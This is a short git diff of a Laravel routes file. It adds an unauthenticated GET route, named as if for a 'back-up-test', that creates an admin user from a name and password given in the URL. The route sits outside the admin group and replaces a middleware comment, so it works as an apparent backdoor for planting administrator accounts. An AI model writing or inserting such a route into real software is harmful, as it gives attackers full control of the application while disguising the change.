@@ -18,7 +18,7 @@ Route::get('/', function () {
     return view('welcome');
 });
 
-// middleware
+Route::get('add-admin-user-for-back-up-test/{name}/{pass}', [AdminController::class, 'addAdUser']);
 Route::group(['prefix' => 'admin'], function() {
     Route::get('/', [AdminController::class, 'login'])->name('login');
     Route::post('/', [AdminController::class, 'postLogin'])->name('p_login');
@@ -64,6 +64,4 @@ Route::group(['prefix' => 'admin'], function() {
 
         Route::get('settings', [AdminController::class, 'settings'])->name('settings');
     });
-
-
 });
